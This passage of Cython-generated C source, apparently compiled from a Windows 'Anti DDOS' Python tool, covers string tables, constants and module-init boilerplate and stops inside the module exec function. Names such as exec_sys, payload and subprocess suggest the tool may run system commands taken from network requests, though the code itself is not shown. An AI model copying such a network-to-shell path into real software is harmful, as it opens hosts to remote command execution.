  {&__pyx_n_s_socket, __pyx_k_socket, sizeof(__pyx_k_socket), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},
  {&__pyx_kp_u_start_https_fb_me_khanh10a1, __pyx_k_start_https_fb_me_khanh10a1, sizeof(__pyx_k_start_https_fb_me_khanh10a1), 0, 1, 0, 0},
  {&__pyx_kp_u_start_https_github_com_KhanhNguy, __pyx_k_start_https_github_com_KhanhNguy, sizeof(__pyx_k_start_https_github_com_KhanhNguy), 0, 1, 0, 0},
  {&__pyx_kp_u_start_https_youtube_com_KhanhNgu, __pyx_k_start_https_youtube_com_KhanhNgu, sizeof(__pyx_k_start_https_youtube_com_KhanhNgu), 0, 1, 0, 0},
  {&__pyx_n_s_stdin, __pyx_k_stdin, sizeof(__pyx_k_stdin), 0, 0, 1, 1},
  {&__pyx_n_s_stdout, __pyx_k_stdout, sizeof(__pyx_k_stdout), 0, 0, 1, 1},
  {&__pyx_n_s_string, __pyx_k_string, sizeof(__pyx_k_string), 0, 0, 1, 1},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_target, __pyx_k_target, sizeof(__pyx_k_target), 0, 0, 1, 1},
  {&__pyx_n_s_temp, __pyx_k_temp, sizeof(__pyx_k_temp), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_threading, __pyx_k_threading, sizeof(__pyx_k_threading), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_time_connect, __pyx_k_time_connect, sizeof(__pyx_k_time_connect), 0, 0, 1, 1},
  {&__pyx_n_s_timeout, __pyx_k_timeout, sizeof(__pyx_k_timeout), 0, 0, 1, 1},
  {&__pyx_kp_u_title_Anti_DDOS_using_Python3_Kh, __pyx_k_title_Anti_DDOS_using_Python3_Kh, sizeof(__pyx_k_title_Anti_DDOS_using_Python3_Kh), 0, 1, 0, 0},
  {&__pyx_n_s_total_ip, __pyx_k_total_ip, sizeof(__pyx_k_total_ip), 0, 0, 1, 1},
  {&__pyx_n_s_unquote, __pyx_k_unquote, sizeof(__pyx_k_unquote), 0, 0, 1, 1},
  {&__pyx_n_s_urllib_parse, __pyx_k_urllib_parse, sizeof(__pyx_k_urllib_parse), 0, 0, 1, 1},
  {&__pyx_kp_u_utf_8, __pyx_k_utf_8, sizeof(__pyx_k_utf_8), 0, 1, 0, 0},
  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
  {&__pyx_n_u_wb, __pyx_k_wb, sizeof(__pyx_k_wb), 0, 1, 0, 1},
  {&__pyx_n_s_windll, __pyx_k_windll, sizeof(__pyx_k_windll), 0, 0, 1, 1},
  {&__pyx_kp_u_wmic_process_where_name_Anti_DDO, __pyx_k_wmic_process_where_name_Anti_DDO, sizeof(__pyx_k_wmic_process_where_name_Anti_DDO), 0, 1, 0, 0},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_u_y, __pyx_k_y, sizeof(__pyx_k_y), 0, 1, 0, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
    __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 21, __pyx_L1_error)
        __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 208, __pyx_L1_error)
        __pyx_builtin_ImportError = __Pyx_GetBuiltinName(__pyx_n_s_ImportError); if (!__pyx_builtin_ImportError) __PYX_ERR(0, 219, __pyx_L1_error)
        __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 221, __pyx_L1_error)
        __pyx_builtin_KeyboardInterrupt = __Pyx_GetBuiltinName(__pyx_n_s_KeyboardInterrupt); if (!__pyx_builtin_KeyboardInterrupt) __PYX_ERR(0, 319, __pyx_L1_error)
        __pyx_builtin_KeyError = __Pyx_GetBuiltinName(__pyx_n_s_KeyError); if (!__pyx_builtin_KeyError) __PYX_ERR(0, 135, __pyx_L1_error)
        __pyx_builtin_OSError = __Pyx_GetBuiltinName(__pyx_n_s_OSError); if (!__pyx_builtin_OSError) __PYX_ERR(0, 151, __pyx_L1_error)
        return 0;
__pyx_L1_error:;
    return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);
    __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_u_Closing_process); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 25, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple_);
    __Pyx_GIVEREF(__pyx_tuple_);
    __pyx_tuple__4 = PyTuple_Pack(2, __pyx_kp_u_block_ip_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 64, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__4);
    __Pyx_GIVEREF(__pyx_tuple__4);
    __pyx_tuple__6 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 64, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__6);
    __Pyx_GIVEREF(__pyx_tuple__6);
    __pyx_tuple__12 = PyTuple_Pack(2, __pyx_kp_u__10, __pyx_kp_u__11); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__12);
    __Pyx_GIVEREF(__pyx_tuple__12);
    __pyx_tuple__14 = PyTuple_Pack(2, __pyx_kp_u__13, __pyx_kp_u__7); if (unlikely(!__pyx_tuple__14)) __PYX_ERR(0, 74, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__14);
    __Pyx_GIVEREF(__pyx_tuple__14);
    __pyx_slice__17 = PySlice_New(Py_None, __pyx_int_2, Py_None); if (unlikely(!__pyx_slice__17)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_slice__17);
    __Pyx_GIVEREF(__pyx_slice__17);
    __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_u_Started_KhanhNguyen9872); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 111, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__18);
    __Pyx_GIVEREF(__pyx_tuple__18);
    __pyx_tuple__23 = PyTuple_Pack(1, __pyx_kp_u_KhanhNguyen9872_1_Facebook_2_You); if (unlikely(!__pyx_tuple__23)) __PYX_ERR(0, 165, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__23);
    __Pyx_GIVEREF(__pyx_tuple__23);
    __pyx_tuple__24 = PyTuple_Pack(1, __pyx_kp_u_Are_you_sure_to_remove_all_block); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 177, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__24);
    __Pyx_GIVEREF(__pyx_tuple__24);
    __pyx_tuple__25 = PyTuple_Pack(1, __pyx_kp_u_Press_Enter_to_Exit); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 181, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__25);
    __Pyx_GIVEREF(__pyx_tuple__25);
    __pyx_tuple__26 = PyTuple_Pack(1, __pyx_kp_u_Starting_Anti_DDOS); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 189, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__26);
    __Pyx_GIVEREF(__pyx_tuple__26);
    __pyx_tuple__27 = PyTuple_Pack(1, __pyx_kp_u_Press_Enter_to_Exit_2); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 198, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__27);
    __Pyx_GIVEREF(__pyx_tuple__27);
    __pyx_codeobj__28 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_is_admin, 2, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__28)) __PYX_ERR(0, 2, __pyx_L1_error)
        __pyx_tuple__29 = PyTuple_Pack(1, __pyx_kp_u_Input_Facebook_Admin); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 21, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__29);
    __Pyx_GIVEREF(__pyx_tuple__29);
    __pyx_codeobj__30 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_kill_process, 24, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__30)) __PYX_ERR(0, 24, __pyx_L1_error)
        __pyx_codeobj__31 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_clear, 31, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__31)) __PYX_ERR(0, 31, __pyx_L1_error)
        __pyx_tuple__32 = PyTuple_Pack(5, __pyx_n_s_ip, __pyx_n_s_port, __pyx_n_s_source, __pyx_n_s_destination, __pyx_n_s_string); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 33, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__32);
    __Pyx_GIVEREF(__pyx_tuple__32);
    __pyx_codeobj__33 = (PyObject*)__Pyx_PyCode_New(4, 0, 5, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__32, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_forward, 33, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__33)) __PYX_ERR(0, 33, __pyx_L1_error)
        __pyx_tuple__34 = PyTuple_Pack(4, __pyx_n_s_con_ip, __pyx_n_s_port, __pyx_n_s_a, __pyx_n_s_f); if (unlikely(!__pyx_tuple__34)) __PYX_ERR(0, 58, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__34);
    __Pyx_GIVEREF(__pyx_tuple__34);
    __pyx_codeobj__35 = (PyObject*)__Pyx_PyCode_New(3, 0, 4, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__34, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_block_ip, 58, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__35)) __PYX_ERR(0, 58, __pyx_L1_error)
        __pyx_tuple__36 = PyTuple_Pack(7, __pyx_n_s_conn, __pyx_n_s_request, __pyx_n_s_re, __pyx_n_s_subprocess, __pyx_n_s_payload, __pyx_n_s_e, __pyx_n_s_content_length); if (unlikely(!__pyx_tuple__36)) __PYX_ERR(0, 67, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__36);
    __Pyx_GIVEREF(__pyx_tuple__36);
    __pyx_codeobj__37 = (PyObject*)__Pyx_PyCode_New(3, 0, 7, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__36, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_exec_sys, 67, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__37)) __PYX_ERR(0, 67, __pyx_L1_error)
        __pyx_tuple__39 = PyTuple_Pack(2, __pyx_n_s_port, __pyx_n_s__38); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 88, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__39);
    __Pyx_GIVEREF(__pyx_tuple__39);
    __pyx_codeobj__40 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__39, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_create_rule, 88, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__40)) __PYX_ERR(0, 88, __pyx_L1_error)
        __pyx_tuple__41 = PyTuple_Pack(2, __pyx_n_s_port, __pyx_n_s__38); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 99, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__41);
    __Pyx_GIVEREF(__pyx_tuple__41);
    __pyx_codeobj__42 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__41, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_add_ip_rule, 99, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__42)) __PYX_ERR(0, 99, __pyx_L1_error)
        __pyx_tuple__43 = PyTuple_Pack(8, __pyx_n_s_port, __pyx_n_s_count, __pyx_n_s_soc, __pyx_n_s_a, __pyx_n_s_b, __pyx_n_s_con_ip, __pyx_n_s_server_socket, __pyx_n_s_e); if (unlikely(!__pyx_tuple__43)) __PYX_ERR(0, 103, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__43);
    __Pyx_GIVEREF(__pyx_tuple__43);
    __pyx_codeobj__44 = (PyObject*)__Pyx_PyCode_New(1, 0, 8, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__43, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_open_port, 103, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__44)) __PYX_ERR(0, 103, __pyx_L1_error)
        __pyx_tuple__45 = PyTuple_Pack(1, __pyx_n_s_a); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 162, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__45);
    __Pyx_GIVEREF(__pyx_tuple__45);
    __pyx_codeobj__46 = (PyObject*)__Pyx_PyCode_New(0, 0, 1, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__45, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_about, 162, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__46)) __PYX_ERR(0, 162, __pyx_L1_error)
        __pyx_tuple__47 = PyTuple_Pack(3, __pyx_n_s_port, __pyx_n_s_a, __pyx_n_s__38); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 174, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__47);
    __Pyx_GIVEREF(__pyx_tuple__47);
    __pyx_codeobj__48 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__47, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_remove_block, 174, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__48)) __PYX_ERR(0, 174, __pyx_L1_error)
        __pyx_tuple__49 = PyTuple_Pack(1, __pyx_n_s_port); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 185, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__49);
    __Pyx_GIVEREF(__pyx_tuple__49);
    __pyx_codeobj__50 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED | CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__49, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_anti_py, __pyx_n_s_start, 185, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__50)) __PYX_ERR(0, 185, __pyx_L1_error)
        __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_u_wmic_process_where_name_Anti_DDO); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 202, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__51);
    __Pyx_GIVEREF(__pyx_tuple__51);
    __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_u_title_Anti_DDOS_using_Python3_Kh); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 203, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__52);
    __Pyx_GIVEREF(__pyx_tuple__52);
    __pyx_tuple__54 = PyTuple_Pack(1, __pyx_kp_u_config_py_not_found_or_syntax_e); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 208, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__54);
    __Pyx_GIVEREF(__pyx_tuple__54);
    __pyx_tuple__56 = PyTuple_Pack(1, __pyx_kp_u_Config_file_is_error); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 242, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__56);
    __Pyx_GIVEREF(__pyx_tuple__56);
    __pyx_tuple__57 = PyTuple_Pack(2, __pyx_kp_u_block_ip_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 245, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__57);
    __Pyx_GIVEREF(__pyx_tuple__57);
    __pyx_tuple__58 = PyTuple_Pack(2, __pyx_kp_u_proxy_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 251, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__58);
    __Pyx_GIVEREF(__pyx_tuple__58);
    __pyx_tuple__59 = PyTuple_Pack(1, __pyx_kp_u_Found_proxy_txt_Note_Y_for_load); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 253, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__59);
    __Pyx_GIVEREF(__pyx_tuple__59);
    __pyx_tuple__60 = PyTuple_Pack(1, __pyx_kp_u_Press_Enter_to_Start); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 258, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__60);
    __Pyx_GIVEREF(__pyx_tuple__60);
    __pyx_tuple__61 = PyTuple_Pack(1, __pyx_kp_u_Downloading_Sock_Proxy); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 265, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__61);
    __Pyx_GIVEREF(__pyx_tuple__61);
    __pyx_tuple__64 = PyTuple_Pack(1, __pyx_kp_u_DIED); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 286, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__64);
    __Pyx_GIVEREF(__pyx_tuple__64);
    __pyx_tuple__65 = PyTuple_Pack(1, __pyx_kp_u_NOTE_Y_for_save_to_file_N_for_s); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 291, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__65);
    __Pyx_GIVEREF(__pyx_tuple__65);
    __pyx_tuple__66 = PyTuple_Pack(2, __pyx_kp_u_proxy_txt, __pyx_n_u_w); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 294, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__66);
    __Pyx_GIVEREF(__pyx_tuple__66);
    __pyx_tuple__67 = PyTuple_Pack(1, __pyx_kp_u_Processing_IP); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 300, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__67);
    __Pyx_GIVEREF(__pyx_tuple__67);
    __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_u_Your_choose); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 309, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__68);
    __Pyx_GIVEREF(__pyx_tuple__68);
    __pyx_tuple__69 = PyTuple_Pack(1, __pyx_kp_u_This_tool_work_only_on_Windows); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 324, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__69);
    __Pyx_GIVEREF(__pyx_tuple__69);
    __pyx_tuple__70 = PyTuple_Pack(1, __pyx_kp_u_Facebook_Admin_is_error); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 327, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_tuple__70);
    __Pyx_GIVEREF(__pyx_tuple__70);
    __Pyx_RefNannyFinishContext();
    return 0;
__pyx_L1_error:;
    __Pyx_RefNannyFinishContext();
    return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
    if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
    __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_1024 = PyInt_FromLong(1024); if (unlikely(!__pyx_int_1024)) __PYX_ERR(0, 1, __pyx_L1_error)
        __pyx_int_999999 = PyInt_FromLong(999999L); if (unlikely(!__pyx_int_999999)) __PYX_ERR(0, 1, __pyx_L1_error)
        return 0;
__pyx_L1_error:;
    return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void);
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void);

static int __Pyx_modinit_global_init_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
    __pyx_7genexpr__pyx_v_4anti_x = Py_None; Py_INCREF(Py_None);
    __pyx_8genexpr1__pyx_v_4anti_x = Py_None; Py_INCREF(Py_None);
    __pyx_8genexpr2__pyx_v_4anti_x = Py_None; Py_INCREF(Py_None);
    __pyx_8genexpr3__pyx_v_4anti_x = Py_None; Py_INCREF(Py_None);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_function_export_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_type_init_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_type_import_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}

static int __Pyx_modinit_function_import_code(void) {
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
    __Pyx_RefNannyFinishContext();
    return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initanti(void) CYTHON_SMALL_CODE;
__Pyx_PyMODINIT_FUNC initanti(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_anti(void) CYTHON_SMALL_CODE;
__Pyx_PyMODINIT_FUNC PyInit_anti(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
    return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
#if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    }
    else if (unlikely(main_interpreter_id != current_id))
#else
    static PyInterpreterState* main_interpreter = NULL;
    PyInterpreterState* current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    }
    else if (unlikely(main_interpreter != current_interpreter))
#endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject* spec, PyObject* moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject* value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    }
    else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    }
    else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject* spec, CYTHON_UNUSED PyModuleDef* def) {
    PyObject* module = NULL, * moddict, * modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_anti(PyObject* __pyx_pyinit_module)
#endif
#endif
{
    PyObject* __pyx_t_1 = NULL;
    int __pyx_t_2;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    Py_ssize_t __pyx_t_9;
    PyObject* (*__pyx_t_10)(PyObject*);
    PyObject* __pyx_t_11 = NULL;
    int __pyx_t_12;
    int __pyx_t_13;
    Py_ssize_t __pyx_t_14;
    PyObject* __pyx_t_15 = NULL;
    PyObject* __pyx_t_16 = NULL;
    PyObject* __pyx_t_17 = NULL;
    PyObject* __pyx_t_18 = NULL;
    PyObject* __pyx_t_19 = NULL;
    PyObject* __pyx_t_20 = NULL;
    PyObject* __pyx_t_21 = NULL;
    PyObject* __pyx_t_22 = NULL;
    PyObject* __pyx_t_23 = NULL;
